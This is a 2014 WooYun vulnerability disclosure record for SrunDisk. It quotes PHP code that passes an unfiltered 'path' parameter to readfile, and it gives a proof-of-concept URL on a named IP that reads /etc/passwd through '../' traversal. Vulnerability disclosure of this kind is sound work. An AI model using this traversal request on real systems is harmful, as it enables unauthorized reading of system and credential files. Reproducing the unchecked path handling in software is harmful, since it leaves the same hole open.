{"id": 56219, "wybug_id": "wooyun-2014-058487", "wybug_title": "深澜软件漏洞SrunDisk任意文件下载", "wybug_corp": "srun.com", "wybug_author": "xlz0iza1", "wybug_date": "2014-04-27 13:57", "wybug_open_date": "2014-07-23 18:34", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-02：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向公众公开  简要描述： RT 详细说明：  \nif($res=$shared->gets(\"\",\"file_type DESC\"))\t{\t\tforeach($res as $k => $v)\t\t{\t\t\t$shid=$v[\"shid\"];\t\t\t$path=$v[\"path\"];\t\t\tif(!is_file($path))\t\t\t{\t\t\t\t$shared->path=$path;\t\t\t\t$shared->del();\t\t\t\tcontinue;\t\t\t}\t\t\t\t\t\t$path1=substr(strrchr($path,\"/\"),1);\t\t\t\t\t\t\t\t\t$file_time=date(\"Y-m-d H:i:s\",filemtime($path));\t\t\t$member_id=$v[\"member_id\"];\t\t\t$member_name=$v[\"member_name\"];\t\t\t$type=$res[0][\"file_type\"];\t\t\t$url=\"user_space.php?username=\".$username.\"&act=shared_show&path=\".urlencode($path);\t\t\tswitch($ftype)\t\t\t{\t\t\t\tcase 2:\t\t\t\t$url1=\"<a href='user_space.php?username=\".$username.\"&act=big_pic_show&path=\".urlencode($path).\"' target='_blank'>\";\t\t\t\tbreak;\t\t\t\tcase 3:\t\t\t\t$url1=\"<a href='#' onclick='return false'>\";\t\t\t\tbreak;\t\t\t\tcase 4:\t\t\t\t$url1=\"<a href='#' onclick='return false'>\";\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t$url1=\"<a href='user_space.php?username=\".$username.\"&act=shared_show&path=\".urlencode($path).\"'>\";\t\t\t}\t\t\tif(is_dir($path))\t\t\t{\t\t\t\t\t\t\t\t$icon=\"pics/dir_big.gif\";\t\t\t}\t\t\telse\t\t\t{\t\t\t\tswitch(strtolower(strrchr($path1,\".\")))\t\t\t\t{\t\t\t\t\tcase \".jpg\":\t\t\t\t\t\t$icon=\"user_space.php?act=pic_show&username=\".$username.\"&path=\".urlencode($path);\t\t\t\t\t\t\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".jpeg\":\t\t\t\t\t\t$icon=\"user_space.php?act=pic_show&username=\".$username.\"&path=\".urlencode($path);\t\t\t\t\t\tbreak;\t\t\t\t\t\t\t\t\t\t\tcase \".gif\":\t\t\t\t\t\t$icon=\"user_space.php?act=pic_show&username=\".$username.\"&path=\".urlencode($path);\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".png\":\t\t\t\t\t\t$icon=\"user_space.php?act=pic_show&username=\".$username.\"&path=\".urlencode($path);\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".mp3\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".wma\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".wmv\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".mpg\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\t\tcase \".avi\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".flv\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".3gp\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\tcase \".swf\":\t\t\t\t\t\t$icon=\"pics/mp3_big.gif\";\t\t\t\t\t\tbreak;\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tdefault:\t\t\t\t\t\t$icon=\"pics/file_big.gif\";\t\t\t\t\t\t\t\t\t\t\t\tbreak;\t\t\t\t}\t\t\t\t\t\t\t}\t\t\t\t\t\t$eidolon->loopBlock(\"td\");\t\t\t$i++;\t\t\tif($i>4)\t\t\t{\t\t\t\t$i=0;\t\t\t\t$eidolon->loopBlock(\"tr\",\"td\");\t\t\t\t$eidolon->cleanBlock(\"td\");\t\t\t}\t\t}\t\t$eidolon->loopBlock(\"tr\",\"td\");\t}\t\t$shared->cutPage($eidolon);\t$eidolon->parseBlock(\"_main\",\"tr\");\t$eidolon->showBlock(\"_main\");}else if($_GET[\"act\"]==\"pic_show\"){\t$file_path=$_GET[\"path\"]; \tif(!file_exists($file_path))\t{\t\texit(\"file not found\");\t}\t$w=($_GET[\"w\"])?$_GET[\"w\"]:120;\t$h=($_GET[\"h\"])?$_GET[\"h\"]:120;\t\tif($imgsize=getimagesize($file_path))\t{\t\t\t$width=$w;\t\t\t$height=$w/$imgsize[0]*$imgsize[1];\t}\telse\t{\t\t\texit;\t}\tif($height>$h)\t{\t\t\t$height=$h;\t\t\t$width=$h/$imgsize[1]*$imgsize[0];\t}\t\t\t$file_type=strtolower(strchr($file_path,\".\"));\t\t\t//switch(exif_imagetype($file_path))\tswitch($file_type)\t{\t\t\t//case IMAGETYPE_JPEG:\t\t\tcase \".jpg\":\t\t\t\t\t$im   = imagecreatefromjpeg($file_path);\t\t\t\t\tbreak;\t\t\tcase \".jpeg\":\t\t\t\t\t$im   = imagecreatefromjpeg($file_path);\t\t\t\t\tbreak;\t\t\t//case IMAGETYPE_PNG:\t\t\tcase \".png\":\t\t\t\t\t$im   = imagecreatefrompng($file_path);\t\t\t\t\tbreak;\t\t\t//case IMAGETYPE_GIF:\t\t\tcase \".gif\":\t\t\t\t\t$im   = imagecreatefromgif($file_path);\t\t\t\t\tbreak;\t\t\tdefault:\t\t\t\t\texit;\t\t}\t\t$srcW = ImageSX($im);\t$srcH = ImageSY($im);\t$ni=imagecreatetruecolor($width,$height);\timagecopyresampled($ni,$im,0,0,0,0,$width,$height,$srcW,$srcH);\theader(\"Content-Type:image/jpeg\");\tImageJpeg($ni);\t}else if($_GET[\"act\"]==\"shared_show\"){\t$file_path=$_GET[\"path\"];\tif(!is_file($file_path))\t{\t\texit(\"error\");\t\t}\t$file_name=substr(strrchr($file_path,\"/\"),1);\t\t$type  = substr(strrchr($file_path,\".\"),1);\tswitch(strtolower($type))\t{\t\t\tcase \"jpg\":\t\t\t\t\t$mime=\"image/jpeg\";\t\t\t\t\tbreak;\t\t\tcase \"jpeg\":\t\t\t\t\t$mime=\"image/jpeg\";\t\t\t\t\tbreak;\t\t\tcase \"png\":\t\t\t\t\t$mime=\"image/png\";\t\t\t\t\tbreak;\t\t\tcase \"gif\":\t\t\t\t\t$mime=\"image/gif\";\t\t\t\t\tbreak;\t\t\tdefault:\t\t\t\t\t$mime=\"application/\".$type;\t}\theader(\"Content-Type:\".$mime);\theader(\"Content-Disposition: attachment; filename=\".urlencode($file_name));\treadfile($file_path);\t}else if($_GET[\"act\"]==\"big_pic_show\"){\t$file_path=$_GET[\"path\"];\tif(!is_file($file_path))\t{\t\texit(\"error\");\t\t}\t$file_name=substr(strrchr($file_path,\"/\"),1);\t\t$type  = substr(strrchr($file_path,\".\"),1);\tswitch(strtolower($type))\t{\t\t\tcase \"jpg\":\t\t\t\t\t$mime=\"image/jpeg\";\t\t\t\t\tbreak;\t\t\tcase \"jpeg\":\t\t\t\t\t$mime=\"image/jpeg\";\t\t\t\t\tbreak;\t\t\tcase \"png\":\t\t\t\t\t$mime=\"image/png\";\t\t\t\t\tbreak;\t\t\tcase \"gif\":\t\t\t\t\t$mime=\"image/gif\";\t\t\t\t\tbreak;\t\t\tdefault:\t\t\t\t\t$mime=\"application/\".$type;\t}\theader(\"Content-Type:\".$mime);\t//header(\"Content-Disposition: attachment; filename=\".urlencode($file_name));\treadfile($file_path);\t}else if($_GET[\"act\"]==\"passwd_input\"){\techo \"<form action='user_space.php?username=\".$username.\"' method='post'>请输入密码：<input type='password' name='pass' size='16'><input type='submit' value='提交'></form>\";}\n$username $path$username没有过滤，$path参数只进行了URL编码urlencode($path)，导致任意文件下载。   漏洞证明：  漏洞证明：\nhttp://218.75.75.92/user_space.php?username=zaizai&act=shared_show&path=../../../../../../../../../etc/passwd\n\n\n\n\n   修复方案：  看了下代码几乎没有过滤,太含糊把。   版权声明：转载请注明来源 xlz0iza1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-23 18:34 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}